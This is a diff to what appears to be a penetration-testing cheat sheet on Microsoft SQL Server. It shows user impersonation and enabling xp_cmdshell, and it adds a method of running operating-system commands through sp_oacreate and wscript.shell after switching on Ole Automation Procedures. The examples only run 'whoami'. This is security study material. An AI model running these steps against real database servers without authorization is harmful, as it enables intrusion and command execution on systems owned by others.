@@ -114,7 +114,9 @@ Now, to impersonate we can use this statements:
 2. EXECUTE AS USER = 'dbo';
 ```
 
-**CODE EXECUTION(through xp_cmdshell):**
+**CODE EXECUTION:**
+
+*Through xp_cmdshell:*
 
 Use this commands at this order:
 
@@ -122,6 +124,24 @@ Use this commands at this order:
 1st EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 2nd EXEC xp_cmdshell "whoami";
+```
+
+*Through sp_oacreate and sp_oamethod:*
+
+First, we will instanitate Windows Script Host using the "sp_oacreate" statement, and then we will use the "sp_oamethod" to call the Windows Script Host "run" method.
+
+```
+1. DECLARE @myshell INT;      -> the "@myshell" variable is where we want our OLE object to be stored
+
+2. EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
+
+3.  EXEC sp_oamethod @myshell, 'run', null, 'whoami';
+```
+
+However, since "sp_oacreate" and "sp_oamethod" are disabled by default we must first enable them:
+
+```
+1. EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
 ```
 
 **CODE EXECUTION ON A LINKED MSSQL SERVER:**
